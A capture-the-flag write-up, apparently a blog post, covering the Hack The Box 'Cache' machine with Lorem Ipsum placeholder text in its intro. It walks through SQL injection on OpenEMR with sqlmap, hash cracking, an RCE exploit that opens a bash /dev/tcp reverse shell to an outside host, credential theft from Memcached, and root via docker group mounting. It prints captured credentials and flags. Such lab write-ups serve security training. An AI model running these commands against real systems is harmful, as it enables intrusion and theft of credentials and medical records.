---
layout: single
title: Cache - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2020-06-05
classes: wide
header:
  teaser: /assets/images/htb-writeup-cache/cache_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
categories:
  - hackthebox
  - infosec
tags:  
  - linux
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-cache/cache_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝


1. root@nidus:/git/htb/cache# nmap -Pn -sC -sV -n 10.10.10.188
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)
    |   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)
    |_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: Cache
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    DIRB:
    + http://10.10.10.188/index.html (CODE:200|SIZE:8193)
    + http://10.10.10.188/javascript/jquery/jquery (CODE:200|SIZE:268026)

    NIKTO:
    + /login.html: Admin login page/section found.


2. Visiting the site and looking around gives us a hostname on the 'author.html'-page, cache.htb. We also find the name of the
   of the author, Ash, as well as the name of his other project - HMS.
   A login page is obvious, trying SQLi seems to be useless. Looking through the source we can see that the form links to
   'net.html'. Visiting net.html flashes a picture and then returns us to the login page.

   We can confirm that user 'ash' is correct, as it only gives us an error for the password.

   Further enumeration in the js-files we find something. The file funtionality.js contains the following function:
     function checkCorrectPassword(){
      var Password = $("#password").val();
      if(Password != 'H@v3_fun'){
          alert("Password didn't Match");
          error_correctPassword = true;

   We are now able to login using creds ash:H@v3_fun, however it only says "Welcome Back!" along with a picture of a
   anime cowboy and the text "This page is still underconstruction". Possible rabbit hole?

   Adding hms.htb in our hosts-file gives us access to OpenEMR.

   Admin Login:
    http://hms.htb/interface/login/login.php?site=default

   Customer Portal:
    http://hms.htb/portal/


3. Reading about OpenEMR we find that there are a authentication bypass vulnerability, allowing an unauthenticated user to view
   patient records - to add a cherry on top, the patient records are also vulnerable to SQLi.

   Browse to the customer portal, press 'Register' to grab a authenticated cookie, and then start to view authenticated pages as
   you please. To execute the SQLi start your proxy, and catch your GET request to:

    http://hms.htb/portal/add_edit_event_user.php?eid=1'

   Copy the request and paste it into a file, and remove  the' (url-encoded to %27)
   Fire up SQLmap and attack!


   root@nidus:/git/htb/cache# cat openemr.req
     GET /portal/add_edit_event_user.php?eid=1 HTTP/1.1
     Host: hms.htb
     User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
     Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
     Accept-Language: en-US,en;q=0.5
     Accept-Encoding: gzip, deflate
     Connection: close
     Cookie: OpenEMR=rn8u2gc83jdnfb64codf22edvd; PHPSESSID=h9anmkcdmjgcshjdns6jhictuc
     Upgrade-Insecure-Requests: 1

   root@nidus:/git/htb/cache# sqlmap -r openemr.req  --threads=10 --dbs
     ..
     [12:16:59] [INFO] the back-end DBMS is MySQL
     back-end DBMS: MySQL >= 5.1
     ..
     available databases [2]:
     [*] information_schema
     [*] openemr

   Continue to enumerate tables to user information.
   root@nidus:/git/htb/cache# sqlmap -r openemr.req  --threads=10 -D openemr --tables
    ..
    [12:21:32] [INFO] retrieved: 'users'
    [12:21:32] [INFO] retrieved: 'users_secure'
    ..

  View the columns in users_secure.
  root@nidus:/git/htb/cache# sqlmap -r openemr.req  --threads=10 -D openemr -T users_secure --dump
    Database: openemr
    Table: users_secure
    [1 entry]
    +------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+
    | id   | salt                           | username      | password                                                     | last_update         | salt_history1 | salt_history2 | password_history1 | password_history2 |
    +------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+
    | 1    | $2a$05$l2sTLIG6GTBeyBf7TAKL6A$ | openemr_admin | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. | 2019-11-21 06:38:40 | NULL          | NULL          | NULL              | NULL              |
    +------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+


4. Crack the found password hash, using hashcat.

    root@nidus:/git/htb/cache# cat hash.txt
      $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.

    root@nidus:/git/htb/cache# hashcat -a0 -m3200 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
      ..
      Status...........: Cracked

    root@nidus:/git/htb/cache# cat cracked.txt
      $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.:xxxxxx

    Login with the cracked credentials - openemr_admin:xxxxxx


5. When authenticated, there are several exploits. One interesting is a RCE, giving us a reverse shell. https://www.exploit-db.com/exploits/45161
   Download the script, setup your listener and execute.

   root@nidus:/git/htb/cache# python openemr_rce.py http://hms.htb/ -u openemr_admin -p xxxxxx -c 'bash -i >& /dev/tcp/10.10.14.17/4488 0>&1'
   root@nidus:~# nc -lvnp 4488
    listening on [any] 4488 ...
    connect to [10.10.14.17] from (UNKNOWN) [10.10.10.188] 36004
    bash: cannot set terminal process group (1251): Inappropriate ioctl for device
    bash: no job control in this shell

    www-data@cache:/var/www/hms.htb/public_html/interface/main$ whoami
      www-data


6. Run linpeas and we find some local running services, 3306 (MySQL) and 11211 (Memcached). Memcached is not well known, so I
   decide to start there. Googling for "Memcached Priv Esc" I found a writeup for the old HTB box Dab, and within they extract
   data from Memcached slabs.

    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
    ..
    tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
    tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -


    Access Memcached through a local Telnet session.
    </public_html/interface/main$ telnet 127.0.0.1 11211

    List available slabs with 'stats slabs'
     stats slabs
      STAT 1:chunk_size 96
      STAT 1:chunks_per_page 10922
      STAT 1:total_pages 1
      STAT 1:total_chunks 10922
      STAT 1:used_chunks 5
      STAT 1:free_chunks 10917
      STAT 1:free_chunks_end 0
      STAT 1:mem_requested 371
      STAT 1:get_hits 0
      STAT 1:cmd_set 1415
      STAT 1:delete_hits 0
      STAT 1:incr_hits 0
      STAT 1:decr_hits 0
      STAT 1:cas_hits 0
      STAT 1:cas_badval 0
      STAT 1:touch_hits 0
      STAT active_slabs 1
      STAT total_malloced 1048576
      END

    We have a lot of stats and we can retrieve the active slab class: 1.
    Syntax: stats cachedump <slab class> <number of items to dump>
     stats cachedump 1 1000
      ITEM link [21 b; 0 s]
      ITEM user [5 b; 0 s]
      ITEM passwd [9 b; 0 s]
      ITEM file [7 b; 0 s]
      ITEM account [9 b; 0 s]
      END

    User and Passwd looks promising, so we dump thoese.
    Syntax: get <item name>
     get user
      VALUE user 0 5
      luffy
      END

     get passwd
      VALUE passwd 0 9
      0n3_p1ec3
      END

     get account
      VALUE account 0 9
      afhj556uo
      END


7. The credentials, luffy:0n3_p1ec3, can be used to access the box through SSH. Maybe some of the passwords we've found throughout
   this journey can be used for user Ash, so I decided to try changing user.

   luffy@cache:/dev/shm$ id
    uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)
   luffy@cache:/dev/shm$ su ash
    Password: H@v3_fun
   ash@cache:/dev/shm$ whoami
    ash
   ash@cache:/dev/shm$ cat /home/ash/user.txt
    6d6c7f30cc8a6f30d6064c93626c0ad2


   NOTE VERIFIED CREDS:
     ash:H@v3_fun
     luffy:0n3_p1ec3
     openemr_admin:xxxxxx


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Enumerating the box as user ash gives is nothing really to go on. So instead I went back to luffy to investigate, especially the
   group 999(docker) which I've never seen before. Googling about docker groups tells us there are an easy exploit where we can mount
   a folder/file to a container and/or image.

   Looking at our box we don't have any containers, however we do have the ubuntu image which we can use for our exploit.

   luffy@cache:/dev/shm$ docker container ls
    CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES

   luffy@cache:/dev/shm$ docker image ls
    REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
    ubuntu              latest              2ca708c1c9cc        8 months ago        64.2MB


   Next, we mount the directory /root to our docker image /mnt directory, to extract root.txt and in a real life scenario SSH-keys.

   luffy@cache:/dev/shm$ docker run --help
      ..
      -i, --interactive                    Keep STDIN open even if not attached
      -t, --tty                            Allocate a pseudo-TTY
      -v, --volume list                    Bind mount a volume

   luffy@cache:/dev/shm$ docker run -v /root:/mnt -it ubuntu
   root@30194c706a68:/# id
      uid=0(root) gid=0(root) groups=0(root)
   root@30194c706a68:/# cd /mnt/
   root@30194c706a68:/mnt# ls -al
      ..
      -rw------- 1 root root   33 Jun  5 07:27 root.txt
   root@30194c706a68:/mnt# cat root.txt
      ca89fe2e56238df32bac7edc90488959


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

OpenEMR:
  https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf
  https://www.databreaches.net/openemr-patches-serious-vulnerabilities-uncovered-by-project-insecurity/
  https://www.exploit-db.com/exploits/45161

Memcached:
  https://medium.com/@noobintheshell/htb-dab-writeup-6459329737d0

Docker privesc:
  https://www.hackingarticles.in/docker-privilege-escalation/
